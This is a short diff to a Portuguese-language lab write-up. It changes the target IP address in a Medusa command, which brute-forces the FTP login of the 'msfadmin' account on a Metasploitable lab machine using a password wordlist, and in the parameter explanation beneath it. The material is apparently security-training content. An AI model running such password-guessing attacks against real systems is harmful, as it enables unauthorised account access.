@@ -32,11 +32,11 @@ Utilizando a ferramenta Medusa, executei o comando apontando para o meu arquivo 
 
 Comando utilizado:
 ```bash
-medusa -h 192.168.56.101 -u msfadmin -P minha_wordlist.txt -M ftp -f
+medusa -h 192.168.68.150 -u msfadmin -P minha_wordlist.txt -M ftp -f
 ```
 
 Explicação dos parâmetros:
- - -h 192.168.56.101: Endereço IP do alvo (Metasploitab)
+ - -h 192.168.68.150: Endereço IP do alvo (Metasploitab)
  - -P minha_wordlist.txt: Caminho para o arquivo que criei com as senhas de teste.
  - -M ftp: Módulo específico para atacar o protocolo FTP.
  - -f: Stop on Found (Para a execução assim que a senha correta for encontrada).
